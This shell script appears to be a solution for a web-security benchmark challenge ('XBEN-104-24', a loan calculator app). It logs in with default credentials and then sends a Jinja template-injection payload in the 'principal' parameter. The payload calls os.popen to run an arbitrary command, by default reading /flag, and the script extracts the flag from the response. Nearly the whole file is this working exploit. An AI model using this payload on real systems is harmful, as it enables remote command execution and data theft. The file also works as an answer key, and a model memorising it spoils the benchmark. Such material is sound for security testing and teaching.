#!/usr/bin/env bash
# XBEN-104-24 — "Loan Calculator - Simple" (tags: ssti, default_credentials)
#
# `/total_loan_payments` builds its JSON response as a *Jinja template string*
# with the `principal` parameter interpolated into it, and then renders that
# string. Two of the three values are `{{ }}` placeholders filled from the
# context; the third is the attacker's, pasted into the template source.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben104-$$"
COMMAND="${2:-cat /flag}"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/login" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/login' \
    --set 'form.username=test' --set 'form.password=test' \
    --session "$SESSION" >/dev/null
seq="$("$H5I" websec replay req_0 --create --set 'path=/total_loan_payments' \
    --set "query.principal={{ cycler.__init__.__globals__.os.popen(\"$COMMAND\").read() }}" \
    --set 'query.payment=1' --set 'query.term=1' \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
